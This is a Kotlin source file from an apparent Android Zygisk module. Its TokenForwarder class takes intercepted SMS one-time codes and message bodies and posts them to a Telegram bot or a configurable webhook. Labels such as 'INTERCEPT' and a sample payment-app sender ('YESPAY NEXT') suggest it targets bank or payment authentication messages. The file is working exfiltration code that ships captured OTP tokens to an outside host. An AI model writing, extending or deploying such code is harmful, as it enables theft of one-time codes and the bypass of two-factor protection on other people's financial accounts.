package com.hivirtus.zygiskmode

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class TokenForwarder(private val configManager: ConfigManager) {

    private val client = OkHttpClient()

    fun forward(otp: LastOtp): Boolean {
        val config = configManager.load()
        if (!config.autoForwardToken) return false

        val botToken = config.telegramBotToken
        val chatId = config.telegramChatId

        if (botToken.isBlank() || chatId.isBlank()) {
            if (config.forwardUrl.isBlank()) return false
            return forwardWebhook(config.forwardUrl, config.forwardMethod, otp, config)
        }

        return forwardTelegram(botToken, chatId, otp, config)
    }

    fun sendTestMessage(): Boolean {
        val config = configManager.load()
        val botToken = config.telegramBotToken
        val chatId = config.telegramChatId
        if (botToken.isBlank() || chatId.isBlank()) return false

        val senderId = SmsMatcher.savedSenderId(config) ?: "AD-YESPRO-S"
        val testOtp = LastOtp(
            otp = "TEST1234",
            sender = senderId,
            body = "sZ/HWb9+LtFZSOaVeU9+baPVa9X4imd4wq4noAGAFKvKenId/qwYS8IYcuU8OP3XLllboZ/ARatoNaJtWdZ7g==",
            phone = senderId,
            messageLabel = "YESPAY NEXT"
        )
        return forwardTelegram(botToken, chatId, testOtp, config)
    }

    private fun forwardTelegram(botToken: String, chatId: String, otp: LastOtp, config: ModuleConfig): Boolean {
        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp, config))
    }

    fun buildZygiskMenuMessage(otp: LastOtp, config: ModuleConfig? = null): String {
        val cfg = config ?: configManager.load()
        val senderId = SmsMatcher.savedSenderId(cfg) ?: otp.sender.ifBlank { otp.phone }
        val messageLabel = otp.messageLabel.ifBlank { formatSenderLabel(senderId) }
        val tokenBody = otp.body.ifBlank { otp.otp }

        return buildString {
            appendLine("📱 <b>Hivirtus Zygisk Mode</b>")
            appendLine("<b>Mode By @hivirtus @liqdy</b>")
            appendLine("────────────────")
            appendLine("📤 <b>Sender ID:</b> ${escapeHtml(senderId)}")
            appendLine("💬 <b>App:</b> $messageLabel")
            append(escapeHtml(tokenBody))
        }
    }

    private fun escapeHtml(text: String): String {
        return text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    private fun formatSenderLabel(sender: String): String {
        var label = sender.trim()
        listOf("AD-", "VM-", "JD-", "BP-", "TX-").forEach { prefix ->
            if (label.startsWith(prefix, ignoreCase = true)) {
                label = label.substring(prefix.length)
            }
        }
        label = label.trim('-', ' ')
        if (label.endsWith("-S", ignoreCase = true)) label = label.dropLast(2)
        return label.uppercase().ifBlank { "INTERCEPT" }
    }

    private fun postTelegram(botToken: String, chatId: String, text: String): Boolean {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val payload = JSONObject()
            .put("chat_id", chatId)
            .put("text", text)
            .put("parse_mode", "HTML")
            .put("disable_web_page_preview", true)
            .toString()
        return postJson(url, payload)
    }

    private fun forwardWebhook(url: String, method: String, otp: LastOtp, config: ModuleConfig): Boolean {
        val senderId = SmsMatcher.savedSenderId(config) ?: otp.sender
        val payload = JSONObject()
            .put("otp", otp.otp)
            .put("token", otp.body.ifBlank { otp.otp })
            .put("sender_id", senderId)
            .put("message_label", otp.messageLabel)
            .put("direction", otp.direction)
            .put("telegram_format", buildZygiskMenuMessage(otp, config))
            .toString()

        val request = Request.Builder()
            .url(url)
            .method(method.uppercase(), payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }

    private fun postJson(url: String, payload: String): Boolean {
        val request = Request.Builder()
            .url(url)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }
}
